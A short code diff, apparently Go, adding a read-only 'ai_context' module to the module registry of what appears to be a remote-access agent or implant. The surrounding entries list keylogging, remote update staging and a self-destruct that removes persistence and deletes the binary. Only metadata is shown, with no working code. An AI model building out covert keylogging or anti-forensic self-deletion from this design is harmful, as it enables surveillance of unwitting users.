@@ -48,6 +48,7 @@ var Modules = []Module{
 	{Name: "keylog_stop", Summary: "Stop key logging and return the buffer", Platforms: []string{"windows"}, Capability: "keylog", Operator: "operator"},
 	{Name: "update_stage", Summary: "Verify and stage a signed update artifact", Platforms: []string{"windows", "linux", "darwin", "android"}, Operator: "admin",
 		Args: []Arg{{Name: "version", Type: "string", Required: true}, {Name: "url", Type: "string", Required: true}, {Name: "sha256", Type: "string", Required: true}}},
+	{Name: "ai_context", Summary: "Read-only evidence bundle for the AI assistant (host, net, top processes)", Platforms: []string{"windows", "linux", "darwin", "android"}, Capability: "ai", Operator: "viewer"},
 	{Name: "selfdestruct", Summary: "Remove persistence, wipe keys and delete the binary", Platforms: []string{"windows", "linux", "darwin"}, Operator: "admin", Destructive: true},
 }
 
